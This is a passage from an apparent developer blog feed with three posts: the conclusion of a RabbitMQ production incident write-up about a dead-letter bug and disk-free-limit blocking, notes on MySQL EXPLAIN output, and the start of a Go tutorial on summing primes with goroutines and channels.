<p>Just as I thought my shrewed observation has solved this major mystery, the second day, people reported that the queue started go AWOL again! Grumbled, I sat down and read carefully the documentation on <a href="https://www.rabbitmq.com/dlx.html">dead-letter exchange</a> and discovered this:</p>

<blockquote><p>Note that the exchange does not have to be declared when the queue is declared, but it should exist by the time messages need to be dead-lettered; if it is missing then, the messages will be silently dropped.</p></blockquote>


<p>This invalidates my previous hypothesis that the out-of order declaration was the root cause of the problem. There we go, I was back to square one.</p>

<p>At this time, I wanted to try a different approach. Instead of forming hypothesis from observation, I searched for evidence. I went on the server, and start to look at the logs to search for any traces that can be salvaged. The rabbitmq log is very noisy with all the connection messages. Once in a while you get something remotely interesting, but they were not relevant. Then I manually published a message on the queue, and waited for the message and queue to disappear. Lo and behold, there&rsquo;s something in the logs!</p>

<div><script src='https://gist.github.com/e626bcc40eb803214968.js'></script>
<noscript><pre><code>** Reason for termination ==
** {{badmatch,
     {{msg_status,13,
       &lt;&lt;247,153,167,208,33,41,98,109,106,45,132,14,79,220,50,7&gt;&gt;,
       {basic_message,
        {resource,&lt;&lt;&quot;/.../trunk&quot;&gt;&gt;,exchange,&lt;&lt;&quot;...&quot;&gt;&gt;},
        [&lt;&lt;&quot;cardapp.txnfailed&quot;&gt;&gt;],
        {content,60,none,
         &lt;&lt;248,0,16,97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,
           110,5,117,116,102,45,56,0,0,0,0,2,0&gt;&gt;,
         rabbit_framing_amqp_0_9_1,
         [...]},
        &lt;&lt;247,153,167,208,33,41,98,109,106,45,132,14,79,220,50,7&gt;&gt;,
        true},
       true,false,true,true,
       {message_properties,1429816688490829,false}},
      {vqstate,
       {0,{[],[]}},
       {0,{[],[]}},
       {delta,undefined,0,undefined},
       {0,{[],[]}},
       {0,{[],[]}},
       14,
       {1,
        {13,
         {msg_status,13,
          &lt;&lt;247,153,167,208,33,41,98,109,106,45,132,14,79,220,50,7&gt;&gt;,
          undefined,true,true,true,true,
          {message_properties,1429816688490829,false}},
...</code></pre></noscript></div>


<p>There&rsquo;s our smoking gun! Further gooling revealed <a href="http://lists.rabbitmq.com/pipermail/rabbitmq-discuss/2012-April/019368.html">this</a>. That&rsquo;s EXACTLY our issue! And the version of rabbitmq we&rsquo;re using is EXACTLY 2.8.1! What a relief! We just need to upgrade to 2.8.2 and everything would be fine.</p>

<p>So there I was, preparing an internal repository to host the rpm (since we&rsquo;re on a hopelessly old version of CentOS), and prepared puppet changes for the new version. Deployed on all the environments and sent it off to QA. QA ok&#8217;ed it just before the weekend and life is good again.</p>

<p>Except, not at all! There are a few more surprises waiting for us before the end of tunnel. First of all, our partner whose payment API we&rsquo;re integrating has received an imminent DDOS threat, and fearing not having a retry mechanism would caused a huge burden for us and our support crew, we need to get this out to production ASAP. After pulling some levers and convincing our ops team that this is a relatively low risk point release upgrade (from rabbitmq 2.8.1 to 2.8.2), we got the green light and ops are on their way upgrading rabbitmq. Everything seemed to be going alone well, until, when we switched all components to point to the hosts that&rsquo;s on the new rabbitmq, our app stopped working! Phone calls flooded in, alerts set off everywhere and on top of that, even the streets in front of our building had a couple of emergency vehicles passing by! Goodness, what have we done! Ops quickly rolled it back, and we were left dumbfounded by this yet another surprise.</p>

<p>Analyzing the logs from various components during the downtime, it appeared the components talking to rabbitmq have timed out trying to publish messages. We checked that the hosts can indeed reach each other, all the names can be resolved and firewall rules are not in effect. So, we hit a wall again.</p>

<p>On the second day, we regrouped, and experimented on the backup data centre. We upgraded, and tried to put a message on the queue, and guess what, it blocked! It&rsquo;s great that we reproduced the issue. Since the staging environment worked just fine, I captured <code>strace</code> on the staging environment, and ops did the same on prod, and compared the output. It&rsquo;s pretty clear that the process was waiting on reading socket (syscall was <code>recvfrom(...)</code>) and it blocked. Then I did <code>tcpdump</code> and compared that with the output on prod, and also proven to be futile.</p>

<p>In that afternoon, our fortune suddenly took a positive turn, when one of the ops discovered this in the logs while starting the new rabbitmq:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>=INFO REPORT==== 29-Apr-2015::14:51:09 ===
</span><span class='line'>Disk free space limit now exceeded. Free bytes:19033128960 Limit:50634379264</span></code></pre></td></tr></table></div></figure>


<p>So, this version of rabbitmq started to check free disk space, and <strong>blocks</strong> incoming message if the disk space is deemed inadequate! Wow, this is so unexpected that we all laughed when we discovered this to be the root cause. However, for me, I need to be convinced that why it wasn&rsquo;t an issue for staging environment.</p>

<p>So I cloned rabbitmq git repository, and looked for anything that&rsquo;s related to <code>disk_free_limit</code>. Finally, I found this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">{</span><span class="n">disk_free_limit</span><span class="p">,</span> <span class="p">{</span><span class="n">mem_relative</span><span class="p">,</span> <span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="p">}},</span>
</span></code></pre></td></tr></table></div></figure>


<p>from <a href="https://github.com/rabbitmq/rabbitmq-server/blob/rabbitmq_v2_8_2/ebin/rabbit_app.in#L22">here</a>. Since we&rsquo;re using the default config, this is in effect, and it essentially says &ldquo;stop accepting message if the disk space is not at least as big as the RAM&rdquo;, and it just so happens on prod, we have 50G of RAM and therefore, require at least 50G of free space for rabbitmq to start accepting messages!</p>

<p>Reading the rabbitmq 2.8.2 release notes, and they <strong>did</strong> <a href="https://www.rabbitmq.com/release-notes/README-2.8.2.txt">mention</a> this &ldquo;feature&rdquo;, but failed to mention that it could block your connection <strong>forever</strong> and bring your site down&hellip;</p>

<h1>Conclusion</h1>

<p>There you go.  That&rsquo;s our adventure implementing and deploying delayed retry using rabbitmq&rsquo;s DLX and TTL. It&rsquo;s frustrating and rewarding at the same time, and there&rsquo;s definitely something we can all take home with:</p>

<ul>
<li>Software is hard, even for experienced developers and ops</li>
<li>Gather all the evidences before forming hypothesis on the root cause</li>
<li>Certainly, read the docs thoroughly before hypothesizing</li>
<li>Expect problems when switching environments</li>
</ul>


<p>I haven&rsquo;t been blogging for a while, partly because life catches up, and partly because I&rsquo;ve been less than disciplined but I spent some time writing down this experience worth remembering :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MySQL EXPLAIN explained]]></title>
    <link href="http://kevinjqiu.github.io/2014/11/27/mysql-explain-explained/"/>
    <updated>2014-11-27T00:56:59-05:00</updated>
    <id>http://kevinjqiu.github.io/2014/11/27/mysql-explain-explained</id>
    <content type="html"><![CDATA[<p>Below is my notes from watching the <a href="https://www.youtube.com/watch?v=ZoLoIFW1H6g">MySQL&rsquo;s EXPLAIN demystified</a> webinar.  All credits go to Baron Schwartz for this excellent intro to MySQL&rsquo;s query explain.</p>

<h2>How does MySQL execute queries?</h2>

<ul>
<li>SQL => Parse Tree => Execution plan</li>
<li>The execution plan is a data structure, not byte-code</li>
<li>The executor makes storage engine calls</li>
</ul>


<h2>Execution plan</h2>

<p>&ldquo;Deep left tree&rdquo; &ndash; always</p>

<h2>Explain output columns</h2>

<h3>id</h3>

<ul>
<li>which <code>SELECT</code> the row belongs to</li>
<li>Labelled sequentially</li>
<li>complex select:

<ul>
<li>subquery: numbered according to the position in SQL text</li>
<li>derived: executed as a temporary table</li>
<li>union: fill a temp table, then read out with a <code>NULL</code> id</li>
</ul>
</li>
</ul>


<h3>select_type</h3>

<ul>
<li>simple: there&rsquo;s only one <code>SELECT</code> in the whole query, <code>select_type</code> is <code>PRIMARY</code></li>
<li>complex:

<ul>
<li>subquery: numbered according to the position in SQL text</li>
<li>derived: executed as a temporary table</li>
<li>union: fill a temp table, then read out with a <code>NULL</code> id</li>
</ul>
</li>
</ul>


<h3>table</h3>

<ul>
<li>table name or alias</li>
<li><code>&lt;DerivedN&gt;</code>, <code>N</code> correspond to <code>id</code></li>
<li><code>&lt;unionM,N&gt;</code>, <code>M</code>, <code>N</code> correspond to <code>id</code></li>
</ul>


<h3>type</h3>

<ul>
<li>describes how MySQL will access the rows</li>
<li>Possible values:

<ul>
<li>ALL: table scan</li>
<li>index: full index scan</li>
<li>range: range of an index</li>
<li>ref: value as a reference to look into an index if rows in the index match the value</li>
<li>eq_ref: like <code>ref</code> but unique (unique index or PK)</li>
<li>const</li>
<li>system: does not require accessing a table, e.g., <code>MAX(col)</code></li>
<li>NULL: no table involved, e.g., <code>SELECT 1</code></li>
</ul>
</li>
</ul>


<h3>Index-related columns (possible_kes, key, key_len)</h3>

<ul>
<li>possible_keys: which indexes were considered?</li>
<li>key: which indexes did the optimizer choose?</li>
<li>key_len: how many bytes of the index will be used? if key_len less than the index (e.g., compound index), that means MySQL didn&rsquo;t use the whole index</li>
</ul>


<h3>ref</h3>

<ul>
<li>The source of values used for lookups</li>
<li><code>const</code></li>
<li><code>NULL</code> means not looking for a particular value for that table</li>
</ul>


<h3>rows</h3>

<ul>
<li>Estimated rows to examine in the table/index</li>
</ul>


<h3>extra</h3>

<ul>
<li>Using index

<ul>
<li>If the query only involve columns that are in the index, MySQL can query directly against the index, without looking at the table at all</li>
<li>Hitting a index (<code>type</code>) does not necessarily mean <code>Using index</code>.  If not <code>Using index</code>, MySQL got the indexed value but still has to go back and look it up in the table for other columns, which may result in lots of random IO (slow)</li>
</ul>
</li>
<li>Using where

<ul>
<li>Post-filter using the where clause</li>
</ul>
</li>
<li>Using temporary

<ul>
<li>The query is going to create an implicit temporary table</li>
</ul>
</li>
<li>Using filesort

<ul>
<li>Sorting in memory, if it doesn&rsquo;t fit, then write to file</li>
<li>Algorithm is quick sort</li>
</ul>
</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First dip into Golang's concurrency]]></title>
    <link href="http://kevinjqiu.github.io/2013/11/20/first-dip-into-golangs-concurrency/"/>
    <updated>2013-11-20T11:53:00-05:00</updated>
    <id>http://kevinjqiu.github.io/2013/11/20/first-dip-into-golangs-concurrency</id>
    <content type="html"><![CDATA[<p>I have been toying with Google&rsquo;s <a href="http://golang.org">Go</a> language lately.  The native support for concurrent programming is one of Go&rsquo;s major selling point.</p>

<p>Go has low-level primitives for concurrent programming such as <a href="http://golang.org/pkg/sync/#Mutex">mutexes</a> and <a href="http://golang.org/pkg/sync/atomic/">atomic</a>, but also provides high-level language constructs for building concurrent programs via goroutines and channels.</p>

<p>Goroutines are functions executing in the same address space as other goroutines, like threads, but unlike threads, they communicate to each other via channels, not shared variables.</p>

<p>Channels provide a lock-free mechanism for goroutines to communicate.  To me, conceptually it feels a lot like a Unix socket: you can wait on it for data, or you can send data to it.  In Go, channels are also strongly and statically typed.</p>

<p>For me, the best way to learn something is to put it to practice.  I use one problem from <a href="http://projecteuler.net">Project Euler</a>.</p>

<pre><code>Find the sum of all prime numbers under 2 million
</code></pre>

<p>I wrote an Erlang version of this problem <a href="http://kevinjqiu.github.io/blog/2009/06/01/fast-and-elegant-way-to-sum-primes-in-a-gigantic-range/">before</a>, but since then, Erlang kind of fell off my radar.  However, the problem and the concurrent solution is still relevant.</p>

<h1>Test if a number is prime</h1>

<p>I&rsquo;ll briefly go over primality test function, since it&rsquo;s not the focus of this blog post:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">isPrime</span><span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="nx">n</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="nx">n</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="nx">math</span><span class="p">.</span><span class="nx">Mod</span><span class="p">(</span><span class="nb">float64</span><span class="p">(</span><span class="nx">n</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mf">3.0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">math</span><span class="p">.</span><span class="nx">Floor</span><span class="p">(</span><span class="nx">math</span><span class="p">.</span><span class="nx">Sqrt</span><span class="p">(</span><span class="nb">float64</span><span class="p">(</span><span class="nx">n</span><span class="p">)));</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mf">2.0</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="nx">math</span><span class="p">.</span><span class="nx">Mod</span><span class="p">(</span><span class="nb">float64</span><span class="p">(</span><span class="nx">n</span><span class="p">),</span> <span class="nx">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I understand there are other faster primality tests but I opted for this basic algorithm for simplicity.</p>

<h1>Non-concurrent version</h1>

<p>A naive way to solve this problem is to call <code>isPrime</code> on every number below 2 million, if it&rsquo;s a prime, add it to the tally.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">sumPrimesUpto</span><span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">sum</span> <span class="o">:=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="nx">isPrime</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="nx">sum</span> <span class="o">+=</span> <span class="nx">i</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nx">sum</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here&rsquo;s the main function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">upperBound</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nx">Atoi</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Invalid argument.&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="nx">os</span><span class="p">.</span><span class="nx">Exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nx">result</span> <span class="o">:=</span> <span class="nx">sumPrimesUpto</span><span class="p">(</span><span class="nx">upperBound</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now run it and time it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="err">$</span> <span class="nx">time</span> <span class="k">go</span> <span class="nx">run</span> <span class="nx">sumprimes1</span><span class="p">.</span><span class="k">go</span> <span class="mi">2000000</span>
</span><span class='line'><span class="mi">142913828923</span>
</span><span class='line'>
</span><span class='line'><span class="nx">real</span>    <span class="mi">0</span><span class="nx">m27</span><span class="mf">.032</span><span class="nx">s</span>
</span><span class='line'><span class="nx">user</span>    <span class="mi">0</span><span class="nx">m26</span><span class="mf">.953</span><span class="nx">s</span>
</span><span class='line'><span class="nx">sys</span>     <span class="mi">0</span><span class="nx">m0</span><span class="mf">.029</span><span class="nx">s</span>
</span></code></pre></td></tr></table></div></figure>


<p>Not too bad.  I remember when I ran this algorithm 4 years ago on my previous laptop (Core-2 Duo) I wasn&rsquo;t able to produce any result in a tolerable timeframe.  My current machine is a 3-year old Quad Core i7.</p>

<h1>Concurrent version</h1>

<p>If you are on Linux and you open system monitor while the previous program was running, you can see that only one CPU was saturated and constantly running at near 100%, but all other cores are nearly idle.  Of course this is a huge waste of our computing resource.  <code>isPrime</code> function is what takes up the CPU load, and because we&rsquo;re running testing the primality of all 2 million numbers inside a single thread, all of them have to be tested one after the other.  This is not great.  Instead, because we have more than one CPU core, we can give the other cores chances to do some of the work for us.</p>

<p>If you were writing a Java or C++ program, you&rsquo;d:
- make a variable for the sum
- loop from 1 to 2 million
- spawn a new thread to do the primality test
- inside the thread, if the primality test succeeds, lock the access to the <code>sum</code> variable, update <code>sum</code>, unlock</p>

<p>Programs like this have a higher complexity than it should.  It may not look like it&rsquo;s too complicated for this case, but synchronization using <a href="http://en.wikipedia.org/wiki/Lock_(computer_science">locks</a>#Disadvantages) has inherent problems and is usually a source of bugs and defects.  Also, spawning as many threads as you can normally won&rsquo;t give you more throughput.  On the contrary, if you hand the OS more threads at once than the number of physical cores, context switching will happen and it will decrease your performance.</p>

<p>Go&rsquo;s approach is very similar to Erlang&rsquo;s in concept.  In Erlang, the actor processes can&rsquo;t share variables, but instead, they can send data to the other processes.  In Go, goroutines normally don&rsquo;t share variables, but they communicate via the use of channels.</p>

<h2>Channels</h2>

<p>For this problem, we need to have the following channels:
- jobs: the outstanding jobs need to be performed.  Each job is a number whose primality needs to be tested.  It&rsquo;s a buffered channel whose size is the number of physical cores.
- results: the prime numbers that are already tested.  Buffered channel.  Can be as big as reasonable.
- done: whether all workers have finished their job. Also a buffered channel whose size is the number of physical cores.</p>

<h2>Goroutines</h2>

<p>We need the following goroutines to:
- take the next number and put it in the <code>jobs</code> channel
- receive the next available job, run primality test, put the number on the <code>results</code> channel if succeeded, and signal the <code>done</code> channel.
- receive the signal from the <code>done</code> channel.  If no signals are received, we have done all the primality test.</p>

<p>Finally, we need to have a function to sum up all results.</p>

<h2>Data structures</h2>

<p>We want an abstraction of a <code>Job</code>.  In Go, that&rsquo;s a struct:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">type</span> <span class="nx">Job</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">n</span> <span class="kt">int</span>
</span><span class='line'>    <span class="nx">results</span> <span class="kd">chan</span><span class="o">&lt;-</span><span class="kt">int</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>A job knows what number to test, and the results channel to which we can send the result.</p>

<p>A job also knows how to <code>Do</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">job</span> <span class="o">*</span><span class="nx">Job</span><span class="p">)</span> <span class="nx">Do</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="nx">isPrime</span><span class="p">(</span><span class="nx">job</span><span class="p">.</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">job</span><span class="p">.</span><span class="nx">results</span> <span class="o">&lt;-</span> <span class="nx">job</span><span class="p">.</span><span class="nx">n</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In Go, a function with a receiver is practically a method on a struct and is able to be called with <code>receiver.method</code>.</p>

<h2>Rewrite sumPrimesUpto</h2>

<p>Now, rewrite the <code>sumPrimesUpto</code> function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">var</span> <span class="nx">workers</span> <span class="p">=</span> <span class="nx">runtime</span><span class="p">.</span><span class="nx">NumCPU</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="nx">sumPrimesUpto</span><span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">jobs</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">Job</span><span class="p">,</span> <span class="nx">workers</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">results</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">done</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{},</span> <span class="nx">workers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">go</span> <span class="nx">addJobs</span><span class="p">(</span><span class="nx">jobs</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="nx">workers</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">go</span> <span class="nx">doJobs</span><span class="p">(</span><span class="nx">done</span><span class="p">,</span> <span class="nx">jobs</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">go</span> <span class="nx">wait</span><span class="p">(</span><span class="nx">done</span><span class="p">,</span> <span class="nx">results</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nx">tally</span><span class="p">(</span><span class="nx">results</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, we need to know how many CPU cores the underlying platform knows about.  We only make the channel as big as the number of CPU cores.</p>

<p>Then, we make the channels.  One thing to note is that the <code>done</code> channel receives an empty <code>struct</code>, because we use that only for signaling.  We don&rsquo;t really care what value of the signal is.  We could define a surrogate type: <code>type Signal struct{}</code>, but an anonymous type will do just fine.</p>

<p>After that, we call <code>addJobs</code> as a goroutine.  The line <code>jobs &lt;- Job{i, results}</code> will block if the channel is already full.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">addJobs</span><span class="p">(</span><span class="nx">jobs</span> <span class="kd">chan</span><span class="o">&lt;-</span><span class="nx">Job</span><span class="p">,</span> <span class="nx">results</span> <span class="kd">chan</span><span class="o">&lt;-</span><span class="kt">int</span><span class="p">,</span> <span class="nx">n</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">jobs</span> <span class="o">&lt;-</span> <span class="nx">Job</span><span class="p">{</span><span class="nx">i</span><span class="p">,</span> <span class="nx">results</span><span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">close</span><span class="p">(</span><span class="nx">jobs</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In a separate goroutine, we take the jobs from the <code>jobs</code> channel and process them in <code>doJobs</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">doJobs</span><span class="p">(</span><span class="nx">done</span> <span class="kd">chan</span><span class="o">&lt;-</span><span class="kd">struct</span><span class="p">{},</span> <span class="nx">jobs</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="nx">Job</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="nx">job</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">jobs</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">job</span><span class="p">.</span><span class="nx">Do</span><span class="p">()</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nx">done</span> <span class="o">&lt;-</span> <span class="kd">struct</span><span class="p">{}{}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We also signal the <code>done</code> channel when the job is done.  <code>struct{}{}</code> creates an instance of the anonymous type we use as the signal.</p>

<p>In another separate goroutine, we wait until there&rsquo;s no more signals on the <code>done</code> channel.  This means that we have finished processing all jobs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">wait</span><span class="p">(</span><span class="nx">done</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{},</span> <span class="nx">results</span> <span class="kd">chan</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="nx">workers</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&lt;-</span><span class="nx">done</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">close</span><span class="p">(</span><span class="nx">results</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


